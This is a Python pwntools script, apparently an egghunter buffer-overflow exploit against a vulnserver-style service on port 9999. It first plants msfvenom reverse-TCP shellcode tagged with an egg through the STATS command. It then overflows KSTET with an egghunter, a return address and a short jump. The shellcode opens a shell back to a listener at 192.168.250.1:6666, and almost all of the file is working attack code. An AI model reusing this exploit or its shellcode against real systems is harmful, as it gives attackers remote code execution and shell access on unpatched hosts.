from pwn import *

s = remote('192.168.250.132',9999)

badchars = b'\x00'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp -b '\x00' exitfunc=thread -f python LHOST=192.168.250.1 LPORT=6666
shellcode =  b""
shellcode += b"\xbd\x27\x1e\x63\x7b\xdb\xd8\xd9\x74\x24\xf4\x5a\x31"
shellcode += b"\xc9\xb1\x52\x31\x6a\x12\x83\xc2\x04\x03\x4d\x10\x81"
shellcode += b"\x8e\x6d\xc4\xc7\x71\x8d\x15\xa8\xf8\x68\x24\xe8\x9f"
shellcode += b"\xf9\x17\xd8\xd4\xaf\x9b\x93\xb9\x5b\x2f\xd1\x15\x6c"
shellcode += b"\x98\x5c\x40\x43\x19\xcc\xb0\xc2\x99\x0f\xe5\x24\xa3"
shellcode += b"\xdf\xf8\x25\xe4\x02\xf0\x77\xbd\x49\xa7\x67\xca\x04"
shellcode += b"\x74\x0c\x80\x89\xfc\xf1\x51\xab\x2d\xa4\xea\xf2\xed"
shellcode += b"\x47\x3e\x8f\xa7\x5f\x23\xaa\x7e\xd4\x97\x40\x81\x3c"
shellcode += b"\xe6\xa9\x2e\x01\xc6\x5b\x2e\x46\xe1\x83\x45\xbe\x11"
shellcode += b"\x39\x5e\x05\x6b\xe5\xeb\x9d\xcb\x6e\x4b\x79\xed\xa3"
shellcode += b"\x0a\x0a\xe1\x08\x58\x54\xe6\x8f\x8d\xef\x12\x1b\x30"
shellcode += b"\x3f\x93\x5f\x17\x9b\xff\x04\x36\xba\xa5\xeb\x47\xdc"
shellcode += b"\x05\x53\xe2\x97\xa8\x80\x9f\xfa\xa4\x65\x92\x04\x35"
shellcode += b"\xe2\xa5\x77\x07\xad\x1d\x1f\x2b\x26\xb8\xd8\x4c\x1d"
shellcode += b"\x7c\x76\xb3\x9e\x7d\x5f\x70\xca\x2d\xf7\x51\x73\xa6"
shellcode += b"\x07\x5d\xa6\x69\x57\xf1\x19\xca\x07\xb1\xc9\xa2\x4d"
shellcode += b"\x3e\x35\xd2\x6e\x94\x5e\x79\x95\x7f\xa1\xd6\x6f\x7e"
shellcode += b"\x49\x25\x8f\x9b\x83\xa0\x69\xf1\x83\xe4\x22\x6e\x3d"
shellcode += b"\xad\xb8\x0f\xc2\x7b\xc5\x10\x48\x88\x3a\xde\xb9\xe5"
shellcode += b"\x28\xb7\x49\xb0\x12\x1e\x55\x6e\x3a\xfc\xc4\xf5\xba"
shellcode += b"\x8b\xf4\xa1\xed\xdc\xcb\xbb\x7b\xf1\x72\x12\x99\x08"
shellcode += b"\xe2\x5d\x19\xd7\xd7\x60\xa0\x9a\x6c\x47\xb2\x62\x6c"
shellcode += b"\xc3\xe6\x3a\x3b\x9d\x50\xfd\x95\x6f\x0a\x57\x49\x26"
shellcode += b"\xda\x2e\xa1\xf9\x9c\x2e\xec\x8f\x40\x9e\x59\xd6\x7f"
shellcode += b"\x2f\x0e\xde\xf8\x4d\xae\x21\xd3\xd5\xce\xc3\xf1\x23"
shellcode += b"\x67\x5a\x90\x89\xea\x5d\x4f\xcd\x12\xde\x65\xae\xe0"
shellcode += b"\xfe\x0c\xab\xad\xb8\xfd\xc1\xbe\x2c\x01\x75\xbe\x64"


buf = b'STATS l33tl33t'
# buf += chars
buf += shellcode
buf += b'X'*(600-len(buf))
s.recv(1024)
s.sendline(buf)
s.recv(1024)
s.close()

eip = p32(0x625011af)
short_jump = b'\xeb'+p8(-70,sign='signed')
egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8l33t\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

s = remote('192.168.250.132',9999)
buf = b'KSTET '
buf += egghunter
buf += b'\x90'*(70-len(egghunter))
buf += eip
buf += short_jump

s.sendline(buf)

